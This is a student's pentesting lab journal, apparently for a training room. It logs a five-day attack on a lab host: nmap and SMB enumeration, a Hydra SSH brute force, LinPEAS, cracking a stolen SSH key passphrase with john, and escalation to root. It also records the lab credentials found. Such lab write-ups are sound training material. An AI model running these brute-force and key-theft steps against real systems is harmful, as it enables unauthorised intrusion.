# Basic Pentesting – Lab Journal

Chronological log of my actions during Days 1–5.

---

## Day 1 – Setup & Methodology
- Reviewed pentesting phases: Recon → Enumeration → Exploitation → PrivEsc → Reporting.
- Set up toolset: `nmap`, `smbclient`, `hydra`, `john`, `linpeas`.
- Decided on evidence storage layout.

---

## Day 2 – Reconnaissance
**Target:** 10.10.28.38

### Nmap Scan
```bash
nmap -sC -sV -oN evidence/tool-output/01-nmap.txt 10.10.28.38
```
Open ports: 22 (SSH), 80 (HTTP), 139/445 (SMB)

### SMB Enumeration
```bash
smbclient //10.10.28.38/anonymous -N
```
Found `staff.txt` containing usernames: `jan`, `kay`

**Notes:**  
Tried web fuzzing with `ffuf` but got false positives.  
Decided to focus on SSH brute force.

---

## Day 3 – Initial Access
### Hydra SSH Brute Force
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://10.10.28.38
```
**Credentials found:** `jan : armando`

### SSH Access
```bash
ssh jan@10.10.28.38
```
Logged in successfully.

---

## Day 4 – Privilege Escalation
Manual checks with `sudo -l` and SUID search – no results.

### LinPEAS
```bash
./linpeas.sh > evidence/tool-output/linpeas-jan.txt
```
Found `/home/kay/.ssh/id_rsa` readable.

Copied key and cracked passphrase:
```bash
ssh2john id_rsa > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
**Passphrase:** `beeswax`

### SSH as kay
```bash
ssh -i id_rsa kay@10.10.28.38
```
Found `/home/kay/pass.bak` containing root password.

```bash
sudo su
```
Root access obtained.

---

## Day 5 – Documentation
- Collected evidence from `/evidence/`.
- Wrote pentest report.
- Reflected on methodology.

**Lessons Learned:**
- SMB enumeration can reveal high-value usernames.
- Tool output must be verified manually.
- Privilege escalation often comes from weak key permissions.
